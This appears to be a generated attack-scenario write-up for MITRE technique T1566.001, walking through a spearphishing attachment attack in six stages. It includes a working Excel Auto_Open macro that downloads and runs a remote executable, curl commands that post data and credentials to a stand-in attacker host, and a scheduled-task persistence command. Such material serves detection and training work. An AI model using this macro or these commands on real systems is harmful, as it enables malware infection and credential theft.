<output>
Pattern Name: T1566.001 - Spearphishing Attachment
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a payload leading to data exfiltration. The attack leverages multiple applications, including Outlook for email delivery, Excel for executing the payload, and a web browser for C2 communication.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Important Document" and an attachment named "Invoice.xlsx".
- **Key Artifacts**: Email headers, attachment file "Invoice.xlsx".

```shell
# The user opens the email in Outlook and clicks on the attachment.
# The attachment is a malicious Excel file that contains a macro.
```

**Stage 2: Execution of Malicious Macro**
- **Applications Involved**: Excel
- **User Action**: The user opens the attachment, triggering the macro execution.
- **Key Artifacts**: Excel macro code, temporary files created during execution.

```shell
# The macro is executed automatically when the user opens the file.
# The macro may contain commands to download a payload from a remote server.
Sub Auto_Open()
    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objHTTP.Open "GET", "http://malicious-server.com/payload.exe", False
    objHTTP.send
    ' Save the payload to a temporary location
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write objHTTP.responseBody
    stream.SaveToFile Environ("TEMP") & "\payload.exe", 2 ' Overwrite
    stream.Close
    ' Execute the payload
    Shell Environ("TEMP") & "\payload.exe"
End Sub
```

**Stage 3: Payload Execution**
- **Applications Involved**: Windows Explorer, cmd.exe
- **User Action**: The macro downloads and executes the payload.
- **Key Artifacts**: Executable file "payload.exe", process creation logs.

```shell
# The payload is executed, which may establish a reverse shell or beacon to the attacker's C2 server.
# The command might look like this:
cmd.exe /c start "" "%TEMP%\payload.exe"
```

**Stage 4: Command and Control Communication**
- **Applications Involved**: Web Browser (e.g., Chrome), cmd.exe
- **User Action**: The payload initiates a connection to the C2 server.
- **Key Artifacts**: Network traffic logs, DNS queries to the C2 domain.

```shell
# The payload communicates with the C2 server to exfiltrate data.
# Example of a command that sends data back to the attacker:
curl -X POST http://malicious-server.com/exfiltrate -d "data=SensitiveData"
```

**Stage 5: Data Exfiltration**
- **Applications Involved**: cmd.exe, network protocols (HTTP/HTTPS)
- **User Action**: The payload sends collected data to the C2 server.
- **Key Artifacts**: HTTP request logs, data packets containing exfiltrated information.

```shell
# The payload may use HTTP POST requests to send sensitive information.
curl -X POST http://malicious-server.com/exfiltrate -d "username=user&password=pass"
```

**Stage 6: Cleanup and Persistence**
- **Applications Involved**: Windows Task Scheduler, cmd.exe
- **User Action**: The attacker may set up persistence mechanisms.
- **Key Artifacts**: Scheduled tasks, registry entries for persistence.

```shell
# The attacker may create a scheduled task to ensure the payload runs on startup.
schtasks /create /tn "MaliciousTask" /tr "%TEMP%\payload.exe" /sc onlogon /rl highest
```

</output>